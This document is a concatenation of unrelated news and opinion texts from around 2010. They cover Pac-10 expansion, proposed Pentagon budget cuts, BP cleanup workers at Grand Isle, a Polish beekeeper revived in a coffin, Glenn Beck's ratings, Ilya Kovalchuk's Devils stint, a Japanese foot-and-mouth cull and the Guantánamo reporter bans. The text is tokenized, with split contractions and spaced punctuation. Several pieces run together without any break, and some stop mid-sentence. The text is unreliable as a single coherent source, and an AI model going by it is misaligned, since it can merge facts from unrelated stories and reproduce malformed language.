Jill ca n’t understand why the market for stilted , odd language and heavily codified abstractness has dried up .
However , she appreciates that time constraints factor into the mystery .
Says Drew , mouth afoam with gin and pineapple juice :
Few people have the time to really experience the wonders of a newspaper .
You have to commit time to it , to devote the time , which gets harder and harder to do in our fractured , distracted , multimedia world .
That ’s true .
I definitely do n’t have time for the wonders of Mitch Albom , Dave Barry , Steve Duin , and Maureen Dowd .
( Although Erma Bombeck still arouses my love tendrils .
Wait , no , she does n’t — she ’s dead .
Sorry , I regret the error . )
Drew ’s solution is to raise prices :
If people pay more , perhaps they ’ll place a higher value on what ’s delivered , and spend more time with it .
Whiskey Tango Fuck ??!
Look , I ’m not heartless — I can appreciate newspapers ’ nostalgic qualities .
I lament the downfall of a lost industry .
But I wo n’t sob as Scoop Q. Columnist lolls about in his fellowship hammock and 401K plan .
His downsized counterparts in “ lesser , ” “ unchosen ” fields can barely pay their bus fare .
But what do I know ?
My surname means “ swelling lump , ” and I ’m rarely “ free from envy . ”
Lou takes one last look at Typo ’s before hailing a cab .
He feels the icy wind slap his rotund backside .
He then collapses into the snow and dies .

Colorado president Bruce D. Benson said his school was a " perfect match " for the Pac - 10 .
Big 12 commissioner Dan Beebe said in a statement that he was aware that Colorado had accepted the Pac - 10's invitation and is working toward solutions to keep the Big 12 together in some form .
" I continue to work through the process that was agreed upon last week by our Board of Directors to address membership issues , and are working tirelessly towards the long - term viability of the Big 12 , " Beebe said .
A source with direct knowledge of the Pac - 10's discussions about adding more Big 12 teams told ESPN's Joe Schad on Thursday that from the Pac - 10's perspective , it 's " simply a matter of who signs next . "
UCLA coach Rick Neuheisel , who coached at Colorado earlier in his career , said he was " thrilled " to have the Buffaloes in the Pac - 10 .
Colorado was put on two years ' probation in 2002 mostly for recruiting violations that occurred while Neuheisel was the coach there .
Neuheisel said he has a " fond place in my heart for Colorado . "
" From a proximity standpoint , we used to say , it 's closer to Los Angeles than Seattle is .
" So it 's got a lot of natural geographic relationships with the current Pac - 10 and I think it 's going to be a natural fit , " Neuheisel said .
As for whether any other schools might be coming on board , Scott could n't elaborate .
" No invitations have been issued , " he said .
" There are still several different scenarios that we may or may not pursue . "
Scott had no timetable for when this process of possibly adding more schools may play out or an answer for whether the Pac - 10 would stop at just 11 teams .
" I 'm authorized to pursue several different scenarios , " he said .
" What direction it goes in from this point , I ca n't say
because I do n't know . "
Colorado's move might spell the end of the Big 12 Conference .
Nebraska is also poised to announce its move from the conference to the Big Ten .
Texas president William Powers Jr. , athletic director DeLoss Dodds and women 's athletic director Chris Plonsky met with Texas A&M president Bowen Loftin , athletic director Bill Byrne and other university system officials Thursday in Austin , Texas , to discuss the future of their athletic programs and the Big 12 .
A person briefed about the discussions said the situation was " still fluid " and the Texas schools could stay in the Big 12 .
The person , who spoke on condition of anonymity because of the sensitive nature of the situation , said everyone was waiting for Nebraska 's expected announcement Friday .
Among topics discussed was how the Big 12 could operate with fewer teams , the person said , and the consequences such as possible litigation should there be a mass exodus that could leave some teams behind .
U.S. Rep. Chet Edwards , a Democrat from Waco , the site of Baylor , urged Texas lawmakers to immediately hold public hearings on any potential move by the schools .
" These decisions are too important to be decided solely by a small handful of people behind closed doors without public input , " Edwards said .
Dodds has said he wants to keep the Big 12 together , and Texas A&M spokesman Jason Cook said the meeting Thursday included " several topics of mutual interest to both institutions " but that " no decisions were made or agreements reached . "
Baylor and Texas Tech officials have said that even if the Big 12 breaks apart , they want to remain with Texas and Texas A&M as members of the same conference .
But Baylor , the only private school in the Big 12 , could get left behind .
" Baylor is working feverishly to keep the Big 12 together , " Baylor athletic director Ian McCaw said Thursday .
" It is of special importance to keep the four Big 12 schools from Texas together . "
A Big 12 football coach , who spoke on the condition of anonymity , told ESPN.com 's Mark Schlabach on Wednesday night if Nebraska left the Big 12 the conference would dissolve , according to his athletic director and university president .
The coach said Texas , Texas A&M , Texas Tech , Oklahoma , Oklahoma State and Colorado would join the Pac - 10 , leaving Baylor , Kansas , Kansas State , Missouri and Iowa State behind .
The coach said the Pac - 10 favored Colorado over Baylor because of the Buffaloes ' presence in the Denver TV market .
" Nebraska is the key , " the coach said .
Another possibility has Texas A&M looking at joining the Southeastern Conference , sources told Orangebloods.com .
That angle is being pushed by A&M regent Gene Stallings , who coached Alabama to a title in 1992 , the sources said .
Oklahoma State said any report about an immediate announcement by the school about leaving the Big 12 was " without merit . "
" There are no announcements planned by Oklahoma State University , " Gary Shutt , the school 's director of communications , said in a statement .
" We remain committed to the Big 12 Conference .
If there are additional defections , we will have to evaluate our options . "
The Pac - 10 has given some preliminary thoughts to possibly changing its name after bringing in Colorado .
But that 's down the road .
" From my perspective , the name of the conference , the brand -- what it stands for -- ought to reflect the membership , " Scott said .
" Until our deliberations are concluded about what is the constitution of our membership , we wo n't go about the process of thinking about the logo or the name . "
One area the league wants to take a long look at is scheduling .
More specifically , ways to reduce travel to minimize missed classes .
That could mean two divisions based on geographic
location .
" We are determined in whatever scenario we wind up with , through the use of divisions and creative scheduling , to make sure that any of these expansion scenarios -- including the most extreme that you 've heard of -- do not result in significantly greater travel distances nor more missed class time , " Scott said .
" I 'm confident that in any of the scenarios we 're contemplating , that will not be the case . "
The Pac - 10 expanded for the first time since 1978 , when the conference brought in Arizona and Arizona State .
A source close to the Nebraska program told ESPN's Chris Mortensen that athletic director Tom Osborne informed some staff members the Cornhuskers were going to make the move to the Big Ten .
A source with knowledge of the Big Ten 's plans confirmed to ESPN.
com 's Adam Rittenberg that Nebraska will join the Big Ten by the end of this week or early next week .
The source said the formal process of accepting a candidate either has started or would be under way shortly , as Nebraska must formally apply for admission to the Big Ten .
" It 's going to happen , unless something crazy happens in the final hours , " the source said .
" I think by this weekend , it 's going to be wrapped up . "
Besides Nebraska , no other candidates are imminent for the Big Ten , which could stay put with 12 members , the source said .
Meanwhile , a University of Missouri curator said Thursday that the school has not been invited to join the Big Ten Conference , an acknowledgment made as the school 's conference
fights for its survival .
Curator Warren Erdman told The Associated Press that Missouri had not been asked to join the Big Ten .
Erdman noted that he had been out of state the past week but was n't aware of any change in the situation .
He said the curators did not discuss conference affiliation during a closed - door morning meeting .
" Anything could happen , but we 're working hard to stay together , " said Missouri chancellor Brady Deaton , who added that he had called Texas president William Powers to discuss the conference 's future after learning of Colorado 's exodus .
Judy Haggard , chairwoman of the Missouri governing board , suggested that Missouri 's fate remains unclear .
" It 's too soon to say , " she said before the closed meeting .
" We 're going to be getting a lot of information these next two days . "
The Mountain West Conference , which also reportedly was interested in Colorado , said it is monitoring the " developments " in conference expansion .
Boise State of the Western Athletic Conference , is also a candidate to join the Mountain West if it expands .
" We remain in communication with key parties and are continuing to implement our internal strategies .
These deliberations are ongoing and will be remain confidential until the appropriate time , " commissioner Craig Thompson said in a statement .

A panel commissioned by Rep. Barney Frank ( D - Mass . ) is recommending nearly $ 1 trillion in cuts to the Pentagon ’s budget during the next 10 years .
The Sustainable Defense Task Force , a commission of scholars from a broad ideological spectrum appointed by Frank , the House Financial Services Committee chairman , laid out actions the government could take that could save as much as $ 960 billion between 2011 and 2020 .

Measures presented by the task force include making significant reductions to the F - 35 Joint Strike Fighter program , which has strong support from Defense Secretary Robert Gates ; delaying the procurement of a new midair refueling tanker the Air Force has identified as one of its top acquisition priorities ; and reducing the Navy ’s fleet to 230 ships instead of the 313 eyed by the service .
Shipbuilding has strong support in the congressional defense committees , which write the Pentagon bills .
Efforts to reduce the number of ships would run into resistance from the Pentagon and the shipbuilding lobby .
Frank on Friday warned that if he ca n’t convince Congress to act in the “ general direction ” of the task force recommendation , “ then every other issue will suffer . ”
Not cutting the Pentagon 's budget could lead to higher taxes and spending cuts detrimental to the environment , housing and highway construction .
The acceptance of the recommendations would depend on a “ philosophical change " and a “ redefinition of the strategy , ” Frank said at press conference on Capitol Hill .
He said the creation of the deficit reduction commission offers the best opportunity for the reduction recommendations .
Frank wants to convince his colleagues to write to the deficit reduction commission and warn that they would not approve any of the plans suggested by the commission unless reduction of military spending is included .
The task force has looked at various options to trim the Pentagon ’s budget in order to reduce the deficit .
Those include a reduction in Army and Marine Corps end - strength by cutting back on personnel stationed in Europe and Asia ; and rolling back Army and Marine Corps personnel as the wars in Iraq and Afghanistan end .
The panel also looked into reforming military compensation , which could save about $ 55 billion ; saving $ 60 billion by reforming the military healthcare system ; and reducing recruiting expenditures once the wars wind down to preserve about $ 5 billion .
All of these recommendations would be expected to engender congressional opposition .
The task force also suggested canceling the V - 22 Osprey program and the Marine Corps ’s troubled Expeditionary Fighting Vehicle .
The U.S. nuclear arsenal would also be on the chopping block , under the panel ’s suggestions .
The task force recommends reducing the U.S. nuclear warhead total to 1,050 .
Launchers would include 160 Minuteman missiles and seven Ohio- class submarines with 24 missiles ( each with five warheads ) .
The panel also recommends retiring the Air Force bombers — “ the bomber leg of the nuclear triad , ” which includes land - based missiles and nuclear submarines — and ending work on the Trident II missile .
Frank acknowledged Friday that making cuts to the military ’s healthcare system , known as Tricare , would be a “ non-starter ” with his congressional colleagues .
But he said that suggestions on how to handle the nuclear arsenal and missile defense could get a “ great deal ” of support on the Hill .
Frank requested the creation of the task force in cooperation with Reps .

( CNN ) -- A Gulf Coast official accused BP of shipping workers into Grand Isle , Louisiana , for President Barack Obama 's visit to the oil - stricken area Friday and sending them away once the president left the region .
Early Friday morning , " a number of buses brought in approximately 300 to 400 workers that had been recruited all week , " Jefferson Parish Councilman Chris Roberts told CNN's " Situation Room . "
Roberts said the workers were offered $ 12 an hour to come out to the scene at Grand Isle and work in what he called a " dog and pony show . "
But , when Obama departed , so did the workers , he said , adding that he 's never seen more than 20 workers at the Grand Isle cleanup site since the effort started .
BP Chief Operating Officer Doug Suttles downplayed the claim Friday evening , telling CNN it is not unusual to see people wrapping up work in the afternoon .
" These individuals are working out in the heat of the sun .
These are long days .
They start early in the morning and they stop early in the evening , " he said .
" So the fact that they were leaving the location late in the afternoon was not unusual .
It 's not associated with the president arriving . "
Suttles added that the workers would be back Saturday morning to continue working .
The company hired to provide the cleanup workers told WWL , a New Orleans - based radio station , that it was told to beef up the cleaning work force five days ago .
" No , I did not put extra workers on the job because the president was coming , " said Donald Nalty of Environmental Safety and Health , which was contracted by BP to help in the cleanup effort .
An official at the oil cleanup command center told CNN that a temporary busing system had been established to shuttle the growing number of workers because of limited parking and housing accommodations in areas most impacted by the spilled oil .
The official said trained responders were putting in 12 to 14 - hour days .
Roberts told CNN's Anderson Cooper the hundreds of workers who showed up early Friday would n't speak to local emergency management officials .
" The sheriff 's office did manage to get one person to speak with them and that individual said they were hired yesterday and told to report to a staging area at 7:30 this morning , " Roberts added .
" It just does n't add up . "
A Polish beekeeper passed out after being stung and woke up inside a coffin .
Jozef Guzy had been pronounced dead after suffering a suspected heart attack and was about to be sealed up in a coffin when the undertaker discovered a faint pulse .
An ambulance was called and a doctor declared that the 76 - year - old had died .
“ There were no signs of life when his wife called the ambulance , " according to Jerzy Wisniewski , of the Katowice Regional Ambulance Service .
' The patient was not breathing , there was no heart beat , the body had cooled - all are the characteristics of death .
Three hours later , an undertaker arrived to take the body away .
He was placed in a coffin by undertaker Darius Wysluchato until Mr Guzy 's wife , Ludmilla , asked him to retrieve her late husband 's necklace before closing the lid .
As Mr Wys?uchato fiddled with the watch chain he happened to touch Mr Guzy 's neck and detected a pulse .
He said : ' I touched around the neck artery and suddenly realised he as n't dead after all .
I checked again and shouted , " It 's a pulse ! "
' I had a friend check and he noticed the man was breathing .
God , it was a miracle ! "
The same ambulance that had earlier called Mr Guzy 's death rushed back to the scene before admitting the pensioner to intensive care .
After several weeks he made a full recovery .
Doctors have concluded that it was a case of suspended animation .
The doctor who falsely diagnosed him as dead has apologised .
Mr Guzy added , “ The undertaker saved my life .
The first thing I did when I got out of hospital was take him a pot of honey . ”

On his radio show today , Glenn Beck first claimed that his ratings are n’t declining , but then blamed the weather for his loss of one million Fox News viewers .
Beck ’s excuse , “ It ’s called the spring and summer .
It ’s a cycle . ”
The problem is that Beck ’s viewership numbers have been dropping since January , which is in the winter , when people are usually inside their homes watching television .
Here is the audio courtesy of Media Matters :
Advertisements
On the subject of his ratings , Beck said , “ There ’s this great story going around that my ratings have gone down 30 % .
Are you out of you mind ?
I was number one every day last week on cable .
I was number one on all cable news .
Now granted , O’Reilly on vacation , and Bill you can take more time if you like .
You know who wrote that story that ’s now being picked everywhere ?
Media Matters and George Soros , it ’s called let ’s compare apples to apples .
You want to write a story about my ratings ?
Let ’s write a story about MSNBC in the same time frame .
Let ’s look at everyone .
It ’s called the spring and summer .
It ’s a cycle .
It ’s unbelievable , unbelievable . ”
As is becoming the norm , let ’s take a moment to separate the fact from fiction .
Glenn claims that he was number one in all of cable news last week in terms of ratings .
This is true , but what he does n’t tell you is that the Media Matters story points out that Beck has lost one third of his audience , not one third of his ratings share .
Talk about comparing apples and oranges .
His ratings share of the is a percentage of televisions tuned to his show , but his total viewers , which is what Media Matters was talking about is the actual number of people watching his program .
It is possible to have a decline in total viewers , but still have a high ratings share .
American Idol still has a high ratings share even those they have been losing viewers for years .
Second , Media Matters is not owned by George Soros , and the numbers came from Neilson , not Media Matters .
Third , Beck compares himself to MSNBC , but he neglects to mention that Fox News is available in twice as many homes as MSNBC , and that no MSNBC program on CNN program for that matter has lost as many total viewers as Beck has since January .
Lastly , Beck is trying to blame the spring and summer when his decline started in January , and has gone through the winter and into the spring .
Since Beck brought it up let ’s look at his numbers for last week .
He had over 2.4 million viewers last Monday .
On Tuesday , he slipped to 2.3 million viewers .
By Wednesday he was down to 2.2 million viewers , and by Thursday , he was at 2.1 million viewers .
Do you see the pattern ?
Beck starts strong but loses viewers as the week goes on .
The point of the piece I wrote about Beck losing 1 million viewers since January is accurate .
He used to have 3.4 million viewers , but even on his best day last week , he was one million viewers under that number .
It seems that Mr. Beck does not want to accept the reality that his show is in decline .
He ca n’t blame the weather , because his decline started in winter .
He is trying to confuse the issue by blaming MSNBC and George Soros , when the truth is that viewers seem to have grown bored with Beck .
His defense of his ratings rings more than a little hollow , because he has been trying all sorts of gimmicks lately to lure his audience back .
Beck has lost almost a third of his audience in four months , and he is in complete denial about his slide .
Near the end of 2009 , the Devils began to struggle .
The team turned in lackluster performances , and several key players began to slump .
That continued in 2010 , and general manager Lou Lamoriello saw a need to make a big move and shake up the clubhouse .
Meanwhile , in Atlanta , Ilya Kovalchuk turned down a reported 12 year , $ 101 million dollar contract extension to stay with the Thrashers .
He was officially available for trade , and the Devils became a dark - horse candidate to land the talented left - winger .
It seemed to be the perfect storm .
Then , on February 4 , Lamoriello pulled off the biggest trade since Alexander Mogilny .
The team acquired Kovalchuk for struggling defenseman Johnny Oduya , rookie forward Niclas Bergfors , prospect Patrice Cormier and a first round pick in this year ’s draft .
The teams also exchanged second round picks .
Just like that , the Devils seemed to rocket up the predictions board , and analysts handed them the trophy in February .
I even praised the deal , believing he would help them surpass the Caps and Pens .
And , in the end , Kovalchuk became a solid deadline acquisition .
When Lamoriello completed the trade for Kovalchuk , he brought in what the team needed – a deadly scorer who could quarterback the powerplay .
Zach Parise was clearly the offensive leader of this team .
But Kovalchuk could fill the powerplay void .
And Jacques Lemaire tried to fill that void immediately .
Kovalchuk spent most of his 31 games playing one of the points with the man advantage , usually staying on the ice for the entire length of the advantage .
But his presence did n’t vastly improve the powerplay .
In 121 opportunities after the Kovalchuk trade , the team scored 20 goals , clicking at 16.53 % .
That percentage is n’t terrible , and the team also did n’t play up to expectations during that time .
But the fact remains that Kovalchuk did n’t vastly improve the powerplay .
He only collected 12 powerplay points through his 31 games in a Devils ’ sweater .
While he made the powerplay more dangerous , the team could n’t capitalize on his scoring abilities .
Even though Kovalchuk could n’t help on the powerplay , he did seem to mesh well with some of players on the team .
By using Corsi statistics , we can measure the impact Kovalchuk had on his teammates .
The guys over at In Lou We Trust completed this analysis for Kovalchuk , showing he meshed well with certain players .
One of these forwards was Jamie Langenbrunner .
The numbers show that Langenbrunner performed better with Kovalchuk on the ice .
He also played well with Andy Greene .
And he seemed to play better with Patrik Elias than Travis Zajac .
Although the ZZ Pops line has been effective , these numbers seem to justify Lemaire ’s decision to put together Kovalchuk , Elias and Langenbrunner during the playoffs .
While Kovalchuk struggled after the trade , the left - winger showed something many other Devils ’ wingers could n’t do – create his own opportunities .
It always seemed that Kovalchuk could flash his offensive prowess by crossing up defenders and finding the open ice .
While this sometimes led to turnovers , it made the defense concentrate on Kovalchuk , opening up the ice for his linemates .
This style of play also seemed to work well with Elias .
They had several nice plays throughout the season .
It seemed to be a nice match , and one that could continue to grow if Kovalchuk re-signed .
Which brings me to the biggest question of last season : Would Kovalchuk be a rental , or could the Devils somehow find a way to sign him ?
Read after the jump to find out the answer to the question !
Kovalchuk caught a lot of flak from analysts and Devils ’ fans for never reaching his offensive potential .
He seemed to struggle with the transition , and he never really looked comfortable playing in Lemaire ’s system .
Kovalchuk became a solid back - checker , and he did n’t play terribly in his own zone .
That play alone surprised several people .
But he never seemed to have the right line combination .
Elias played well with Kovalchuk , but he ’s not a true center , and never has been .
Langenbrunner played well , but he is n’t the ideal linemate for the left - winger .
Thirty - one games was n’t nearly enough to give Kovalchuk enough time to find suitable linemates and adjust to the system , especially since he came from being the number one player to a second – line player .
I believe many of Kovalchuk ’s struggles came from the coaching staff ’s inability to find a suitable line for the left - winger .
They continually changed his lines around , never giving him enough time to find the chemistry with a steady group .
I know a big trade means adjustments on the fly , but the coaching staff had an entire two weeks to try and discover some working line combinations .
Instead , Lemaire continued to tamper with the lines , and it never let Kovalchuk feel comfortable .
Despite this , he still put up 27 points , averaging nearly a point per game .
Kovalchuk ’s offensive skills ca n’t be questioned .
In his 31 games as a Devil , he showed flashes of the exceptional scorer the team acquired .
But , in the end , he became just a solid pickup .
Without a consistent line , he could never get comfortable .
It always seemed like Kovalchuk straddled the line between consistent and inconsistent while with the Devils this season .
I believe that , with a full year , the team could find a way to exploit his skills and use him to his fullest potential .
But in 31 games , the team only saw the good , and not great , Ilya Kovalchuk .

Japan will slaughter dozens of its top Wagyu stud bulls as a foot - and - mouth outbreak continues its rapid spread through the country 's south .
The outbreak of the highly contagious foot - and - mouth disease has brought a halt to all exports of Japanese beef and pork .
The country 's top stud bull for the famed Miyazaki Wagyu beef has already had to be slaughtered .
Japan will now destroy another 49 seed bulls , leaving only five left .
Farmers had begged the government to spare the animals , but their pleas were rejected by the country 's agriculture minister .
More than 150,000 pigs and 50,000 cows have been destroyed as the foot - and - mouth outbreak continues to spread through the southern island of Kyushu .
The Centerpoint condominium towers in downtown Tempe failed to sell at a foreclosure auction Tuesday , forcing the lender , ML Manager LLC , to take over the property .
Peoria - based ML Manager , the successor to real - estate lender Mortgages Ltd. , asked a minimum bid of $ 8 million to sell the property at the foreclosure auction .
Because there were no bidders , ML Manager now owns the property .
" Our plan is to market the towers to a buyer who will finish them , " said Mark Winkleman , chief operating officer for ML Manager .
He said proceeds from the sale of the project will go toward paying back investors .
Mortgages Ltd.'s loan to Tempe Land Co. LLC , the former developer of Centerpoint , was for approximately $ 135 million .
Tempe Land is a subsidiary of Tempe - based Avenue Communities LLC .
Winkleman said several people attended the foreclosure auction , but no one made a bid .
" There have been reports of problems with the towers and that they need more work than they actually do , " he said .
" The 22 - story tower is 90 percent done . "
The 30 - story tower next to it does need more work and money to be completed .
When Tempe Land converted its bankruptcy motion from Chapter 11 reorganization to Chapter 7 liquidation in September , ML Manager was allowed to file to foreclose on the condo towers .
Mortgages Ltd. financed several high - profile condo and housing projects in the Phoenix area during the boom .
In June 2008 , after the death of Mortgage Ltd. Chief Executive Scott Coles , the lender was forced into bankruptcy by developers .
Mill Avenue District business owners had hoped the Tempe condos would also sell and that work to complete the towers and to fill them with residents would finally resume .
Centerpoint broke ground in Tempe in 2005 .
The development near Maple and Sixth streets was to include an estimated 375 condos , an upscale retail plaza , fine dining and a winery .
The Tempe City Council waived height requirements to approve the 22 - and 30 - story buildings .
Tempe leaders hailed the coming of hundreds of affluent condo dwellers .
Now , weathered plastic tarps and boards drape the vacant property .
Downtown
Tempe stakeholders have complained the towers , which are secured by a chain - link fence , are an eyesore .
There have been reports of transients breaking into the condos , looking for shelter .
Shannon Randle is a manager for Churchill 's Fine Cigars , which is across the street from Centerpoint .
" If I was the city , I would try to have ( the owners ) put a 10 - foot wooden fence around it and put up advertising for all the downtown businesses on the sides ( of the fence ) , " he said .
" They should have that for us as complimentary service for what we have to put up with . "
The Internal Revenue Service has ruled that same - sex couples must be treated the same as heterosexual couples under a feature of California tax law .
Advocates for the change say it is the first time the agency has acknowledged gay couples as a unit for tax purposes .
The change reverses a 2006 IRS ruling and opens a tax benefit to many same - sex couples that was n't available before .
It may affect couples in Nevada and Washington state , as well .
Specifically , the agency said nearly 58,000 couples who are registered as domestic partners in California must combine their income and each report half of it on their separate tax returns .
Same - sex couples account for an estimated 95 % of the state 's domestic partnerships ; partnership status is also available to heterosexual couples in which one partner is over age 62 .
" For the first time ever , I 'm able to file federal taxes that , in a small way , acknowledges what 's going on in my relationship , " said Eric Rey of Berkeley , Calif .
Mr. Rey and his partner requested the IRS ruling , first during the Bush administration and again this year .
The pair wed during a brief window when same - sex marriage was legal in California , but the issue arises because the men are registered as domestic partners .
Same - sex couples , even if they are legally married in their home states , may not file joint federal tax returns .
The federal Defense of Marriage Act , passed in 1996 , defines marriage as between one man and one woman and bars federal agencies from interpreting it otherwise .
Children with home computers likely to have lower test scores
Around the country and throughout the world , politicians and education activists have sought to eliminate the " digital divide " by guaranteeing universal access to home computers , and in some cases to high - speed Internet service .
However , according to a new study by scholars at Duke University 's Sanford School of Public Policy , these efforts would actually widen the achievement gap in math and reading scores .
Students in grades five through eight , particularly those from disadvantaged families , tend to post lower scores once these technologies arrive in their home .
Professors Jacob Vigdor and Helen Ladd analyzed responses to computer - use questions included on North Carolina 's mandated End - of - Grade tests ( EOGs ) .
Students reported how frequently they use a home computer for schoolwork , watch TV or read for pleasure .
The study covers 2000 to 2005 , a period when home computers and high - speed Internet access expanded dramatically .
By 2005 , broadband access was available in almost every zip code in North Carolina , Vigdor said .
The study had several advantages over previous research that suggested similar results , Vigdor said .
The sample size was large -- numbering more than 150,000 individual students .
The data allowed researchers to compare the same children 's reading and math scores before and after they acquired a home computer , and to compare those scores to those of peers who had a home computer by fifth grade and to test scores of students who never acquire a home computer .
The negative effects on reading and math scores were " modest but significant , " they found .
" We cut off the study in 2005 , so we were n't getting into the Facebook and Twitter generation , " Vigdor said .
" The technology was much more primitive than that .
IM ( instant messaging ) software was popular then , and it 's been one thing after the other since then .
Adults may think of computer technology as a productivity tool first and foremost , but the average kid does n't share that perception . "
Kids in the middle grades are mostly using computers to socialize and play games , Vigdor added , with clear gender divisions between those activities .
Vigdor and Ladd concluded that home computers are put to more productive use in households where parental monitoring is more effective .
In disadvantaged households , parents are less likely to monitor children 's computer use and guide children in using computers for educational purposes .
The research suggests that programs to expand home computer access would lead to even wider gaps between test scores of advantaged and disadvantaged students , Vigdor said .
Several states have pursued programs to distribute computers to students .
For example , Maine funded laptops for every sixth - grader , and Michigan approved a program but then did not fund it .

Carol Rosenberg and three other reporters have been banned from covering future hearings at Guantánamo Bay by the Pentagon for naming an interrogator before being warned against it .
Rachel Maddow commented on her program , Friday night ( 4:13 ) :
Four reporters were banned by the Pentagon from reporting on future hearings at Guantánamo Bay , Cuba , Thursday , for reporting the name of a former U.S. Army interrogator , Nancy Youssef reports at McClatchy late Thursday night .
The interrogator , Sergeant Joshua Claus , was on the record as “ Interrogator No.1 , ” but the judges warned the journalists this alias was to be applied by the journalists after at least one of the reporters had filed her report .
Sgt. Claus testified Thursday that while stationed at Bagram Air Base in 2002 , he told then - 15 - year old Omar Khadr he would likely be raped in an American prison .
Mr. Khadr , a born Canadian citizen , is being tried in a military commission — charged with the war crime after being kidnapped by the U.S. military and confessing to killing a U.S. serviceman with a grenade .
The confession , his lawyers contend , was a result of torture and should be inadmissible .
Also , there is no evidence said serviceman died from a grenade and the report on his death was altered .
Sgt. Claus identified himself as one of Mr. Khadr ’s interrogators in a 2008 interview , where he denied torturing the young boy .
He did not incriminate himself in is testimony this week .
He pleaded guilty in 2005 after being charged with assault , prisoner maltreatment and lying to investigators .
He was the last reported man to have interrogated Dilawar — the innocent 22 - year - old , 5 ’ 9 ″ , 122 lbs .
Afghan taxi driver — who was tortured to death while in U.S. detention at Bagram .
The U.S. at the air base in Afghanistan was brought to the public eye in the 2007 Oscar - winning documentary Taxi to the Dark Side .
“ Dilawar ’s last interrogation eroded into more abuse and assault and he was returned to his cell and re-shackled , ” according to an amicus brief submitted by the Project to Enforce the Geneva Conventions .
“ Dilawar was found dead the next morning . ”
Of the four banned reporters is McClatchy ‘s Carol Rosenberg , whose report Sayyid utilized in his post on the show - trial of Omar Khadr , now - 23 years of age .
McClatchy has edited or removed their specific references to Sgt. Claus by name in the testimony reports , but a headline grab at The Huffington Post remains .
Ms. Youssef reports of the bans and the respective news organizations :
Col .
David Lapan , the director of Defense Press Operations , said the ban only affects only the individual reporters and that their organizations would be allowed to send others to future hearings .
The banned reporters were Carol Rosenberg of McClatchy ‘s Miami Herald , Michelle Shephard of the Toronto Star , Paul Koring of Toronto ’s Globe and Mail and Steven Edwards of CanWest Newspapers … .
[ Claus ] was first publicly identified as Khadr ’s interrogator on March 13 , 2008 , during a hearing at Guantanamo .
He subsequently gave an on - the - record interview to Shephard of the Toronto Star , one of the banned reporters , where he asserted that he ’d never abused Khadr , who was 15 years old when he was taken captive by U.S. troops in Afghanistan in 2002 .
“ That reporters are being punished for disclosing information that has been publicly available for years is nothing short of absurd — any gag order that covers this kind of information is not just [ overboard ] but nonsensical , ” said Jameel Jaffer , the deputy legal director for the American Civil Liberties Union , in a statement .
“ Plainly , no legitimate government interest is served by suppressing information that is already well known . ” …
Rosenberg ’s report that day included the following sentences : “ Canadian reports have identified that interrogator as Army Sgt. Joshua Claus , who pleaded guilty in September 2005 to mistreatment and assault of detainees at Bagram .
He was sentenced to five months in jail . ”
Rosenberg said her story was filed before the judge ’s warning .
She said Claus ’ name had already been revealed .
“ All I did was report what was in the public domain , ” Rosenberg said .
“ I am disappointed because I did not violate the ground rules , ” Rosenberg said .
“ I am also surprised because we heard nothing about this , and the ban was issued nearly 24 hours after the piece first appeared . ”
Pentagon officials said it did n’t matter that Claus ’ name was already widely known .
“ If his name was out there , it was not related to this hearing .
Identifying him with Interrogator No. 1 was the problem , ” Lapan said … .
The banned reporters are among the most seasoned on military tribunals and the Khadr case .
Rosenberg is the longest - serving reporter at the American detention center and has covered every hearing of a military commission , with the exception of one week , since the proceedings began in 2004 .
Shephard published a book about the Khadr case .
Koring and Edwards have consistently followed Khadr ’s case for their news organizations .
Mr. Edwards , in 2008 , included Sgt. Claus ’ name with reference to Ms. Shephard ’s interview that identified the interrogator as one of those experienced by Mr. Khadr at Bagram :
Legal arguments before the U.S. war crimes commission in Guantanamo Bay indicated Sgt. Joshua Claus of military intelligence participated in many , maybe all , of the interrogations of the Canadian terror suspect after U.S. forces delivered him to the Bagram detention centre in Afghanistan in July 2002 … .
Prosecutors argued they ’d provided either what they could , or what was relevant to the case , but army Col.
Peter Brownback , the presiding judge , told them to make a bigger effort to comply .
Lt. - Cmdr. Kuebler told Col. Brownback that while Mr. Khadr had undergone “ dozens , if not hundreds ” of interrogations , the prosecution has provided notes of only three from a single interrogator — apparently not Sgt. Claus… .
Lt. - Cmdr .
Kuebler seeks to show at an eventual trial that early statements Mr. Khadr made are invalid if interrogations involved coercion .
At least one Bagram interrogation took place while Mr. Khadr was still being treated in hospital for extensive battlefield wounds suffered during the firefight .
Lt. - Cmdr. Kuebler said Sgt. Claus “ did n’t just participate in numerous interrogations of Omar , according to ( prosecutor Major Jeffrey Groharing ) , he did virtually all of them … .
A fellow interrogator told the probe that on the day Dilawar died , he saw Sgt.
Claus twisting up the back of a hood that he ’d placed over the detainee ’s head .
The same report , first uncovered by The New York Times ( NYT ) in 2005 , told how Sgt.
Claus had made another detainee roll back and forth on the ground kissing a fellow soldier ’s boots .
Last week , Charlie Savage at The New York Times reported the Obama Administration was “ seeking to compel ” his colleague — James Risen — “ to testify about his confidential sources for a 2006 book about the Central Intelligence Agency ” .
Mr. Savage reported Mr. Risen “ received a subpoena [ that week ] requiring him to provide documents and to testify May 4 before a grand jury in Alexandria , Va. , about his sources for a chapter of his book , State of War : The Secret History of the C.I.A. and the Bush Administration “ .
Two weeks before , Thomas Drake — a former official at the National Security Agency ( N.S.A. ) — was indicted “ on charges of providing classified information to a newspaper reporter in hundreds of e-mail messages in 2006 and 2007 ” , Scott Shane reported at the NYT .
Though the indictment did n’t name the reporter or news organization by name , “ the description applies to articles written by Siobhan Gorman , then a reporter for The Baltimore Sun , that examined in detail the failings of several major N.S.A. programs , costing billions of dollars , using computers to collect and sort electronic intelligence ” .
In 2005 , Mr. Risen revealed the existence of the N.S.A. ’s unlawful warrantless wiretapping program and now he finds himself under the threat of losing legal protections with a former N.S.A. official .
Couple these with the recent report by Josh Gerstein and Patrick Gavin at Politico that the White House press corps would only criticize the Administration anonymously “ out of fear of retaliation ” .
“ National political reporters are furious over various White House practices involving transparency and information control , but are unwilling to say so for attribution due to fear of ‘ retaliation ’ , instead insisting on hiding behind a wall of anonymity , ” Glenn Greenwald , at his Salon blog , commented on the report .
“ Is n’t that a rather serious problem : that the White House press corps is afraid to criticize the President and the White House for fear of losing access and suffering other forms of retribution ?
What does that say about their ‘ journalism ’ ? ”
There is a large backlash from the government toward anyone who does not go out of its way to whitewash atrocities in order to portray it as perfect , yet humble — a beacon of hope that stands for justice and goodness and fairness and puppies and ice cream and heroes , etc .
Mr. Greenwald continues :
It ’s the flip side of those White House reporters who need the good graces of Obama aides for their behind - the - scenes books and thus desperately do their bidding …
